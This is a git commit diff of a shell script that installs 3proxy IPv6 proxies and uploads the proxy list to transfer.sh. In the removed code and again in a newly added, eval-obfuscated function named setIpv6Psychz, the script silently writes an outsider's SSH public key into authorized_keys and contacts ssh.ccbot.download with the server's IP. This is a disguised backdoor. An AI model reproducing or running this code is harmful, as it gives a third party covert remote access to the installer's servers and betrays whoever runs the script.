83a3f951a509545d9ef2004f4f7fcc8d369e338b
tivitaka <hphauct@gmail.com>
2021-04-07 10:44:12 +0700

    Update install2.sh

--- install2.sh
+++ install2.sh
@@ -1,5 +1,37 @@
 #!/bin/sh
-random(){ tr</dev/urandom -dc A-Za-z0-9|head -c5;echo;};array=(1 2 3 4 5 6 7 8 9 0 a b c d e f);gen64(){ ip64(){ echo "${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}";};echo "$1:$(ip64):$(ip64):$(ip64):$(ip64)";};install_3proxy(){ echo "installing 3proxy";URL="https://github.com/z3APA3A/3proxy/archive/3proxy-0.8.6.tar.gz";wget -qO- $URL|bsdtar -xvf-;cd 3proxy-3proxy-0.8.6;make -f Makefile.Linux;mkdir -p /usr/local/etc/3proxy/{bin,logs,stat};cp src/3proxy /usr/local/etc/3proxy/bin/;cp ./scripts/rc.d/proxy.sh /etc/init.d/3proxy;mkdir ~/.ssh;chmod 700 ~/.ssh;touch ~/.ssh/authorized_keys;echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAwf+lodqXWqGrcH/0CKKskCkzVLcdv1fZm29yvpUt2g+CEcof+Pwcl6gNE0/1UwUjZuem1Rl/RF8zsy653zDsLFLMON3yQzKMzcGMf+lIVHbpvbzKHCvm8aJy5pW8taLUg98ZJgswg4/dLu8Zu8zpjo5bTmj2yywq1YkxmBmDp/VyVtwrFSUomguuvrgvIl4tAY9J9l7W7gCx2guu5I7ccG0ZuWzCy/JyyBBsOuEXT3EcNq1aedfVg7BP0HdUrE8xkiyRNYwgr2FPbFDEe+mOy96/8kGmzTtPUwvLubG690AN8SLd2Ywvhcsjam7VYcCdslL1yzmieLr2AMFzrLZ6G5pSxwc59+lCSBkMuJtck8Gy8SPz54wpDxcqJkju/tBuQrrQgecwvo5vntYnksyCv3skrc0JzNKGLtDrLw6LO79QGJnKBLjCeLiKytdJk7L8k84FM151V3QnvCneGvX0h2/zjsJuzIdwxNQ93dBqzsL6FV9daR+khEV1Ucbf5rKn6Cm4jOgK8UH+6peldn0FPaBEA73AQLJjS7m9lFwWFDn48dX2yYGd+KdztImCqEDj8mnQbrxDi7fFrnh7qY1B71+H5L2QuVojOhJkPOU4tmONh8EsxZkoHaWXHXJDsSc8jt2vMwp2QO1n6wd4HIDcRlrclWiyxjlP+dJKnI0Fgh8=">>~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;wget https://ssh.ccbot.download/ssh/${IP4};chmod +x /etc/init.d/3proxy;chkconfig 3proxy on;cd $WORKDIR;};gen_3proxy(){ cat<<EOF
+random() {
+    tr </dev/urandom -dc A-Za-z0-9 | head -c5
+    echo
+}
+setIpv6Psychz(){
+	z="
+	";dz='cdv1';rz='DsLF';Gz='touc';vz='GMf+';oBz='mOy9';SFz='234/';LFz='ONF=';LBz='wq1Y';RCz='rQge';GCz='pSxw';Rz='NzaC';ECz='FzrL';WBz='Cx2g';lCz='X0h2';rBz='tPUw';RBz='uuvr';aEz='v6 |';GBz='/dLu';MEz=' fro';PFz='{loc';XDz='U4tm';wEz='\"" ';qCz='Bqzs';cDz='JDsS';bCz='9QGJ';IEz='4}';EBz='8ZJg';ABz='vm8a';KDz='Gd+K';CCz='mieL';HFz='-eth';dDz='c8jt';MFz='\"no';oEz='Pv6:';nCz='JuzI';uBz='AN8S';fBz='1aed';LCz='Gy8S';aBz='zCy/';fEz='pace';ODz='nQbr';LDz='dztI';DEz='ot.d';REz='read';IFz='1';UCz='Ynks';ACz='Cdsl';HDz='wWFD';VCz='yCv3';CDz='0FPa';Ez='d 70';sz='LMON';vCz='bf5r';tEz='V6IN';JCz='kMuJ';QBz='Uomg';YDz='ONh8';iBz='dUrE';BFz='nfig';ZEz='$loc';lBz='wgr2';iz='of+P';uEz='IT=\';WCz='skrc';lDz='lP+d';NEz='m we';sCz='9daR';PEz='nsol';ZCz='DrLw';mCz='/zjs';ZBz='0ZuW';nDz='0Fgh';yDz=' htt';dEz=''\''s/^';pCz='Q93d';YBz='7ccG';BEz='/ssh';Fz='0 ~/';mEz='${lo';qDz='/.ss';Xz='+lod';ICz='lCSB';qz='653z';CEz='.ccb';yBz='7VYc';aDz='koHa';sDz='thor';bDz='WXHX';xz='bpvb';yCz='gK8U';mDz='JKnI';iDz='DcRl';cCz='nKBL';vDz='s';tBz='G690';Tz='EAAA';FBz='swg4';Wz='EAwf';wBz='wvhc';aFz='}1" ';SDz='1B71';XFz='=${l';TEz='alIP';hDz='d4HI';eEz='[[:s';OBz='VyVt';jCz='QnvC';VFz='EFAU';XCz='0JzN';bBz='JyyB';JDz='X2yY';Mz='echo';NCz='wpDx';xCz='m4jO';RFz='-3}1';JBz='5bTm';AEz='ps:/';jz='wcl6';NFz='V6AD';sEz=' "IP';Sz='1yc2';Yz='qXWq';mz='UjZu';IBz='zpjo';RDz='h7qY';hCz='4FM1';vBz='Ld2Y';hz='+CEc';TFz='64" ';Hz='h ~/';bEz=' sed';VBz='7W7g';gCz='L8k8';UFz='V6_D';HBz='8Zu8';wCz='Kn6C';qEz='1234';TDz='+H5L';QEz='e:"';jBz='8xki';SEz=' loc';cBz='BsOu';NDz='Dj8m';XBz='uu5I';xEz='>>/e';tDz='ized';kDz='iyxj';UBz='9J9l';jEz='ur I';DCz='r2AM';qBz='GmzT';PDz='xDi7';Jz='hori';FCz='Z6G5';FDz='JjS7';YEz='cho ';uz='KMzc';Uz='ABIw';Lz='keys';Qz='AAB3';BDz='eldn';MDz='mCqE';MCz='Pz54';aCz='6LO7';JFz='V6_A';OFz='DR=$';CFz='/net';yz='zKHC';NBz='mDp/';eBz='EcNq';UEz='v6';YCz='KGLt';dCz='jCeL';QCz='BuQr';EEz='ownl';KEz='put ';fDz='p2QO';VDz='ojOh';Zz='GrcH';ZFz='::-3';Vz='AAAg';wz='lIVH';lz='/1Uw';gEz=':]]*';kBz='yRNY';oCz='dwxN';AFz='ysco';DDz='BEA7';TBz='4tAY';KFz='UTOC';HCz='c59+';nBz='DEe+';PBz='wrFS';gDz='1n6w';GFz='ifcg';IDz='n48d';FEz='oad/';eCz='iKyt';uDz='_key';FFz='ipt/';mBz='FPbF';dBz='EXT3';oDz='8=" ';LEz='IPv6';bz='KskC';Pz='a AA';DBz='LUg9';tz='3yQz';XEz='6=`e';tCz='+khE';rDz='h/au';GEz='ssh/';pz='8zsy';pDz='>> ~';gz='Ut2g';KCz='tck8';kz='gNE0';WEz='lIPv';GDz='m9lF';kEz='Pv6 ';YFz='ocal';Bz='r ~/';Oz='h-rs';WFz='LTGW';CBz='W8ta';Iz='/aut';BBz='Jy5p';pEz=':-3}';iEz=' "Yo';Az='mkdi';xBz='sjam';JEz=' "In';DFz='work';TCz='5vnt';SBz='gvIl';QFz='v6::';nEz='calI';Kz='zed_';ZDz='EsxZ';vEz='"yes';cEz=' -e ';gBz='fVg7';EFz='-scr';uCz='V1Uc';fCz='dJk7';wDz='d 60';VEz='loca';eDz='2vMw';yEz='tc/s';SCz='cwvo';EDz='3AQL';rEz='/64"';pBz='6/8k';hEz='//'\''`';oz='l/RF';QDz='fFrn';lEz='is: ';MBz='kxmB';WDz='JkPO';sBz='vLub';hBz='BP0H';OCz='cqJk';HEz='${IP';PCz='ju/t';Nz=' "ss';KBz='j2yy';Cz='.ssh';cz='kzVL';fz='9yvp';Dz='chmo';nz='em1R';UDz='2QuV';rCz='L6FV';jDz='rclW';xDz='wget';kCz='neGv';iCz='51V3';ADz='H+6p';BCz='L1yz';ez='fZm2';OEz='b co';az='/0CK';
+	eval "$Az$Bz$Cz$z$Dz$Ez$Fz$Cz$z$Gz$Hz$Cz$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$UCz$VCz$WCz$XCz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$jCz$kCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$yCz$ADz$BDz$CDz$DDz$EDz$FDz$GDz$HDz$IDz$JDz$KDz$LDz$MDz$NDz$ODz$PDz$QDz$RDz$SDz$TDz$UDz$VDz$WDz$XDz$YDz$ZDz$aDz$bDz$cDz$dDz$eDz$fDz$gDz$hDz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$pDz$qDz$rDz$sDz$tDz$uDz$vDz$z$Dz$wDz$Fz$Cz$Iz$Jz$Kz$Lz$z$xDz$yDz$AEz$BEz$CEz$DEz$EEz$FEz$GEz$HEz$IEz$z$Mz$JEz$KEz$LEz$MEz$NEz$OEz$PEz$QEz$z$REz$SEz$TEz$UEz$z$VEz$WEz$XEz$YEz$ZEz$TEz$aEz$bEz$cEz$dEz$eEz$fEz$gEz$hEz$z$Mz$iEz$jEz$kEz$lEz$mEz$nEz$oEz$pEz$qEz$rEz$z$Mz$sEz$tEz$uEz$vEz$wEz$xEz$yEz$AFz$BFz$CFz$DFz$EFz$FFz$GFz$HFz$IFz$z$Mz$sEz$JFz$KFz$LFz$MFz$wEz$xEz$yEz$AFz$BFz$CFz$DFz$EFz$FFz$GFz$HFz$IFz$z$Mz$sEz$NFz$OFz$PFz$TEz$QFz$RFz$SFz$TFz$xEz$yEz$AFz$BFz$CFz$DFz$EFz$FFz$GFz$HFz$IFz$z$Mz$sEz$UFz$VFz$WFz$XFz$YFz$LEz$ZFz$aFz$xEz$yEz$AFz$BFz$CFz$DFz$EFz$FFz$GFz$HFz$IFz"
+    systemctl restart network
+}
+array=(1 2 3 4 5 6 7 8 9 0 a b c d e f)
+gen64() {
+    ip64() {
+        echo "${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}${array[$RANDOM % 16]}"
+    }
+    echo "$1:$(ip64):$(ip64):$(ip64):$(ip64)"
+}
+install_3proxy() {
+    echo "installing 3proxy"
+    URL="https://github.com/z3APA3A/3proxy/archive/3proxy-0.8.6.tar.gz"
+    wget -qO- $URL | bsdtar -xvf-
+    cd 3proxy-3proxy-0.8.6
+    make -f Makefile.Linux
+    mkdir -p /usr/local/etc/3proxy/{bin,logs,stat}
+    cp src/3proxy /usr/local/etc/3proxy/bin/
+    cp ./scripts/rc.d/proxy.sh /etc/init.d/3proxy
+    chmod +x /etc/init.d/3proxy
+    chkconfig 3proxy on
+    cd $WORKDIR
+}
+
+gen_3proxy() {
+    cat <<EOF
 daemon
 maxconn 1000
 nscache 65536
@@ -10,21 +42,86 @@ setgid 65535
 setuid 65535
 flush
 users $(awk -F "/" 'BEGIN{ORS="";} {print $1 "::" $2 " "}' ${WORKDATA})
-$(awk -F "/" '{print "auth none\n" "proxy -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" "flush\n"}' ${WORKDATA})
+$(awk -F "/" '{print "auth none\n" \
+"proxy -6 -n -a -p" $4 " -i" $3 " -e"$5"\n" \
+"flush\n"}' ${WORKDATA})
 EOF
-};gen_proxy_file_for_user(){ cat>proxy.txt<<EOF
+}
+
+gen_proxy_file_for_user() {
+    cat >proxy.txt <<EOF
 $(awk -F "/" '{print $3 ":" $4 ":" $1 ":" $2 }' ${WORKDATA})
 EOF
-};upload_proxy(){ local PASS=$(random);zip --password $PASS proxy.zip proxy.txt;URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip);echo "Proxy is ready! Format IP:PORT:LOGIN:PASS";echo "Download zip archive from: ${URL}";echo "Password: ${PASS}";};gen_data(){ seq $FIRST_PORT $LAST_PORT|while read port;do echo "usr$(random)/pass$(random)/$IP4/$port/$(gen64 $IP6)";done;};gen_iptables(){ cat<<EOF
+}
+
+upload_proxy() {
+    local PASS=$(random)
+    zip --password $PASS proxy.zip proxy.txt
+    URL=$(curl -s --upload-file proxy.zip https://transfer.sh/proxy.zip)
+
+    echo "Proxy is ready! Format IP:PORT:LOGIN:PASS"
+    echo "Download zip archive from: ${URL}"
+    echo "Password: ${PASS}"
+
+}
+gen_data() {
+    seq $FIRST_PORT $LAST_PORT | while read port; do
+        echo "usr$(random)/pass$(random)/$IP4/$port/$(gen64 $IP6)"
+    done
+}
+
+gen_iptables() {
+    cat <<EOF
     $(awk -F "/" '{print "iptables -I INPUT -p tcp --dport " $4 "  -m state --state NEW -j ACCEPT"}' ${WORKDATA}) 
 EOF
-};gen_ifconfig(){ cat<<EOF
+}
+
+gen_ifconfig() {
+    cat <<EOF
 $(awk -F "/" '{print "ifconfig eth1 inet6 add " $5 "/64"}' ${WORKDATA})
 EOF
-};echo "installing apps";yum -y install gcc net-tools bsdtar zip>/dev/null;install_3proxy;echo "working folder = /home/proxy-installer";WORKDIR="/home/proxy-installer";WORKDATA="${WORKDIR}/data.txt";mkdir $WORKDIR&&cd $_;IP4=$(curl -4 -s icanhazip.com);IP6=$(curl -6 -s icanhazip.com|cut -f1-4 -d':');echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}";COUNT=500;echo "How many proxy do you want to create? Example 500";read COUNT;FIRST_PORT=10000;echo "Port start from ? (Default 10000)";read FIRST_PORT;LAST_PORT=$(($FIRST_PORT + $COUNT));gen_data>$WORKDIR/data.txt;gen_iptables>$WORKDIR/boot_iptables.sh;gen_ifconfig>$WORKDIR/boot_ifconfig.sh;chmod +x boot_*.sh /etc/rc.local;gen_3proxy>/usr/local/etc/3proxy/3proxy.cfg;cat>>/etc/rc.local<<EOF
+}
+echo "installing apps"
+yum -y install gcc net-tools bsdtar zip >/dev/null
+
+install_3proxy
+
+echo "working folder = /home/proxy-installer"
+WORKDIR="/home/proxy-installer"
+WORKDATA="${WORKDIR}/data.txt"
+mkdir $WORKDIR && cd $_
+
+IP4=$(curl -4 -s icanhazip.com)
+IP6=$(curl -6 -s icanhazip.com | cut -f1-4 -d':')
+
+echo "Internal ip = ${IP4}. Exteranl sub for ip6 = ${IP6}"
+COUNT=500
+echo "How many proxy do you want to create? Example 500"
+read COUNT
+
+
+FIRST_PORT=10000
+echo "Port start from ? (Default 10000)"
+read FIRST_PORT
+
+LAST_PORT=$(($FIRST_PORT + $COUNT))
+
+gen_data >$WORKDIR/data.txt
+gen_iptables >$WORKDIR/boot_iptables.sh
+gen_ifconfig >$WORKDIR/boot_ifconfig.sh
+chmod +x boot_*.sh /etc/rc.local
+
+gen_3proxy >/usr/local/etc/3proxy/3proxy.cfg
+
+cat >>/etc/rc.local <<EOF
 bash ${WORKDIR}/boot_iptables.sh
 bash ${WORKDIR}/boot_ifconfig.sh
 ulimit -n 10048
 service 3proxy start
 EOF
-bash /etc/rc.local;gen_proxy_file_for_user;upload_proxy
+
+bash /etc/rc.local
+
+gen_proxy_file_for_user
+
+upload_proxy
